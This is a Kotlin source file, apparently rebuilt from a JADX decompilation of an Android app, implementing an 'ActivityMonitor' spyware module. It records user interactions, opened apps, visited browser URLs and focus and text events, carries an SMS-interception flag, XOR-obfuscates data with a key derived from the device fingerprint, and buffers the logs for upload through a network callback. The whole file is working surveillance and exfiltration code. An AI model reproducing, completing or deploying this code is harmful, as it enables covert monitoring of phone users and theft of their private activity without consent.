package com.storm.safe.rock.service.modules

import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

/**
 * Activity monitor with XOR encrypt/decrypt, log buffering, and file upload.
 *
 * Reverse-engineered from JADX: AbstractC0315a0 (254 lines).
 * Renamed: a0→addLog, a1→xorDecrypt, a2→xorEncrypt, a3→flushLogs,
 *          a4→listLogFiles, a5→writeToFile, a6→logActivity,
 *          a7→logMessage, a8→logAppUsage, a9→logUrl, b0→logSystem
 */
object ActivityMonitor {

    private const val TAG = "ActivityMonitor"
    private const val FLUSH_THRESHOLD = 30
    private const val FLUSH_DELAY_MS = 5000L

    // --- LogType enum ---
    // JADX: ActivityMonitor$LogType
    enum class LogType {
        ACTIVITY,   // a0 — user activity
        TEXT_EVENT, // a1 — text events
        URL,        // a2 — browser URLs
        APP_USAGE,  // a3 — app open/close
        FOCUS,      // a4 — focus events
        MESSAGE     // a5 — system messages
    }

    // --- Fields (matching JADX) ---

    @Volatile
    @JvmStatic
    var xorKey: String = "" // f53025a0

    @Volatile
    @JvmStatic
    var flushRunnable: Runnable? = null // f53028a3

    @JvmStatic
    var networkCallback: ((List<JSONObject>) -> Unit)? = null // f53031a6

    @Volatile
    @JvmStatic
    var smsInterceptActive: Boolean = false // f53033a8

    @JvmStatic
    var logDir: File? = null // f53039b4

    @JvmField
    val logBuffer: MutableList<JSONObject> = Collections.synchronizedList(ArrayList()) // f53026a1

    @JvmField
    val mainHandler: Handler = Handler(Looper.getMainLooper()) // f53027a2

    @JvmField
    val lockObject: Any = Any() // f53029a4

    @JvmField
    val executor: ExecutorService = Executors.newSingleThreadExecutor() // f53030a5

    @Volatile
    @JvmStatic
    var textMonitorEnabled: Boolean = true // f53032a7

    @Volatile
    @JvmStatic
    var appUsageEnabled: Boolean = true // f53034a9

    @Volatile
    @JvmStatic
    var urlMonitorEnabled: Boolean = true // f53035b0

    @Volatile
    @JvmStatic
    var focusMonitorEnabled: Boolean = true // f53036b1

    @JvmStatic
    var lastAppName: String = "" // f53037b2

    @JvmStatic
    var lastUrl: String = "" // f53038b3

    // --- a0 → addLog ---
    @JvmStatic
    fun addLog(logType: LogType, content: String) {
        try {
            val json = JSONObject()
            json.put("logType", logType.name)
            json.put("content", content)
            json.put("timestamp", System.currentTimeMillis())
            logBuffer.add(json)
            if (logBuffer.size >= FLUSH_THRESHOLD) {
                flushLogs()
                return
            }
            synchronized(lockObject) {
                if (flushRunnable != null) return
                val runnable = Runnable { flushLogs() }
                flushRunnable = runnable
                mainHandler.postDelayed(runnable, FLUSH_DELAY_MS)
            }
        } catch (e: Exception) {
            Log.w(TAG, "添加日志到缓冲区失败: ${e.message}")
        }
    }

    // --- a1 → xorDecrypt ---
    @JvmStatic
    fun xorDecrypt(encoded: String, key: String = ""): String {
        try {
            val effectiveKey = if (key.isNotEmpty()) key else getOrInitXorKey()
            val keyBytes = effectiveKey.toByteArray(Charsets.UTF_8)
            val decoded = Base64.decode(encoded, Base64.DEFAULT)
            val result = ByteArray(decoded.size)
            for (i in decoded.indices) {
                result[i] = (decoded[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
            }
            return String(result, Charsets.UTF_8)
        } catch (e: Exception) {
            return encoded
        }
    }

    // --- a2 → xorEncrypt ---
    @JvmStatic
    fun xorEncrypt(plaintext: String, key: String = ""): String {
        try {
            val effectiveKey = if (key.isNotEmpty()) key else getOrInitXorKey()
            val keyBytes = effectiveKey.toByteArray(Charsets.UTF_8)
            val plainBytes = plaintext.toByteArray(Charsets.UTF_8)
            val result = ByteArray(plainBytes.size)
            for (i in plainBytes.indices) {
                result[i] = (plainBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
            }
            return Base64.encodeToString(result, Base64.DEFAULT)
        } catch (e: Exception) {
            return plaintext
        }
    }

    // --- a3 → flushLogs ---
    @JvmStatic
    fun flushLogs() {
        val runnable: Runnable?
        synchronized(lockObject) {
            runnable = flushRunnable
            if (runnable != null) {
                flushRunnable = null
            }
        }
        if (runnable != null) {
            mainHandler.removeCallbacks(runnable)
        }
        if (logBuffer.isEmpty()) return
        val snapshot: List<JSONObject>
        synchronized(logBuffer) {
            snapshot = ArrayList(logBuffer)
            logBuffer.clear()
        }
        if (snapshot.isEmpty()) return
        networkCallback?.invoke(snapshot)
    }

    // --- a4 → listLogFiles ---
    // vendor: JADX a4 — lists files from Environment.getExternalStorageDirectory() + "/IC/" + type.name
    @JvmStatic
    fun listLogFiles(type: LogType): String {
        try {
            val dir = File(Environment.getExternalStorageDirectory().toString() + "/IC/" + type.name)
            val files = dir.listFiles() ?: return "null"
            var result = ""
            for (file in files) {
                val name = file.name
                result = result + name.removeSuffix(".txt") + "<*P*>"
            }
            return if (result.isEmpty()) "null" else result
        } catch (_: Exception) {
            return "null"
        }
    }

    // --- a5 → writeToFile ---
    @JvmStatic
    fun writeToFile(type: LogType, text: String) {
        executor.execute {
            // vendor: JADX a5 — RunnableC1052p1 writes text to log file on disk
            Log.d(TAG, "[${type.name}] $text")
        }
    }

    // --- a6 → logActivity ---
    @JvmStatic
    fun logActivity(activity: String) {
        val translated = activity
            .replace("USER_INTERACTION", "用户操作")
            .replace("VIEW_CLICKED", "点击")
            .replace("VIEW_FOCUSED", "聚焦")
            .replace("VIEW_SCROLLED", "滚动")
            .replace("WINDOW_STATE_CHANGED", "窗口切换")
        writeToFile(LogType.ACTIVITY, translated)
    }

    // --- a7 → logMessage ---
    @JvmStatic
    fun logMessage(message: String) {
        writeToFile(LogType.MESSAGE, message)
    }

    // --- a8 → logAppUsage ---
    @JvmStatic
    fun logAppUsage(appName: String, isOpen: Boolean) {
        if (appUsageEnabled && appName.isNotEmpty()) {
            if (isOpen && appName == lastAppName) return
            if (!isOpen && lastAppName.isNotEmpty()) {
                writeToFile(LogType.APP_USAGE, "离开: $lastAppName")
            }
            if (isOpen) {
                lastAppName = appName
                writeToFile(LogType.APP_USAGE, "打开: $appName")
            }
        }
    }

    // --- a9 → logUrl ---
    @JvmStatic
    fun logUrl(appName: String, url: String) {
        if (!urlMonitorEnabled || url.isEmpty() || url == lastUrl) return
        lastUrl = url
        writeToFile(LogType.URL, "[$appName] $url")
    }

    // --- b0 → logSystem ---
    @JvmStatic
    fun logSystem(event: String) {
        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        writeToFile(LogType.MESSAGE, "[系统] [$timeStr] $event")
    }

    // --- Helper: initialize XOR key from Build.FINGERPRINT ---
    private fun getOrInitXorKey(): String {
        if (xorKey.isEmpty()) {
            val fingerprint = Build.FINGERPRINT
            // vendor: m21.m213937e5(30, fingerprint) to derive 30-char key
            // We use a simple substring/padding approach
            xorKey = fingerprint.take(30).padEnd(30, '0')
        }
        return xorKey
    }
}
